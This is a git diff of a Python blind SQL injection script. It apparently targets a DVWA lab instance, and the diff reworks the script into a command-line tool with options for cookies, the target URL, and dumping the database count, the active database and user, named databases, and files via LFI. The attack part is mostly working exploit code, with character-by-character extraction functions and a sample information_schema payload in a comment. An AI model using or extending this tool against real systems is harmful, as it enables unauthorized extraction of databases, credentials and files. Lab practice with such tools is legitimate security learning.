@@ -3,29 +3,75 @@
 import argparse
 import requests
 
-cookies =  {
-	"PHPSESSID": "btus001er4quh49vpqobnhdj45",
-	"security": "low"
-}
 
-url = "http://10.0.2.3/vulnerabilities/sqli_blind/?id="
-payload = "0&Submit=Submit#"
+def main():
 
-r = requests.get(url + payload, cookies=cookies)
-DEFAULT_SIZE = len(r.text)
+	global url
+	global payload
+	global cookies
+
+	cookies = None
+
+	argv = parse_arguments()
+	
+	if argv['cookies'] is not None:
+		cookies = parse_cookies(argv)
+
+	url = ''.join(argv['u'])
+	payload = '&Submit=Submit'
+	
+	print("---> Testing target...")
+	r = requests.get(url, cookies=cookies)
+	
+	if r is not None:
+		print("--> Target is awake")
+
+	if argv['activedb']:
+		print(f"\n--> Active db: {''.join(find_active_db())}")
+	
+	if argv['activeuser']:
+		print(f"\n--> Active user: {''.join(find_user())}")
+
+	if argv['ndbs']:
+		print(f"\n--> {find_n_db()} dbs found")
+	
+
+	#find_db()
+
+
+def parse_cookies(argv):
+	cookies = {}
+
+	to_parse = argv['cookies'].split(";")
+
+	for cookie in to_parse:
+		cookie = cookie.split("=")
+		cookies[cookie[0]] = cookie[1]
+
+	return cookies
 
 def parse_arguments():
 	parser = argparse.ArgumentParser()
-	parser.add_argument('target', metavar='target', type=str, nargs='+', help = 'The endpoint you want to run the script over')
-	parser.add_argument('-data', type=str, help ='Data to be sent over POST (e.g. user=1&pass=1)')
+	dump_group = parser.add_argument_group('DUMP')
+
+	parser.add_argument('-u', metavar='target', type=str, nargs='+', help = 'The endpoint you want to run the script over')
+	parser.add_argument('--cookies', type=str, help = 'e.g. "PHPSESSID=value"')
+	parser.add_argument('--data', type=str, help ='Sent over POST (e.g. user=1&pass=1)')
+
+	dump_group.add_argument('--ndbs', help = 'Dump number of databases', action='store_true')
+	dump_group.add_argument('--activedb', help = 'Dump active db', action='store_true')
+	dump_group.add_argument('--activeuser', help = 'Dump active user', action='store_true')
+	dump_group.add_argument('--all-db', help = 'Dump all db', action='store_true')
+	
+	dump_group.add_argument('--db', type=str, help = 'Dump specified db')
+	dump_group.add_argument('--lfi', metavar='FILE', type=str, help = 'Attempt to dump file')
+
 	args = parser.parse_args()
 	argv = vars(args)
-	target = ''.join(argv['target'])
 
 	return argv
 
 def find_active_db() -> str:
-	size = DEFAULT_SIZE
 	db_len = 0
 	db_name = []
 	i = 1
@@ -63,8 +109,7 @@ def find_active_db() -> str:
 
 	return db_name
 
-def find_user():
-	size = DEFAULT_SIZE
+def find_user() -> str:
 	user_len = 0
 	user_name = []
 	i = 1
@@ -98,7 +143,7 @@ def find_user():
 		else:
 			char += 1
 
-	print(f"--> Nombre de usuario: {''.join(user_name)}")
+	return user_name
 
 
 def find_n_db() -> int:
@@ -114,15 +159,6 @@ def find_n_db() -> int:
 	return i
 
 	# 1' and (select count(schema_name) from information_schema.schemata)=1 -- -
-
-def main():
-	r = requests.get(url, cookies=cookies)
-	db_name = find_active_db()
-	print(f"--> Active db: {''.join(db_name)}")
-	#find_db()
-	#find_user()
-	n_db = find_n_db()
-	print(f"--> {n_db} dbs found")
 
 
 if __name__ == '__main__':
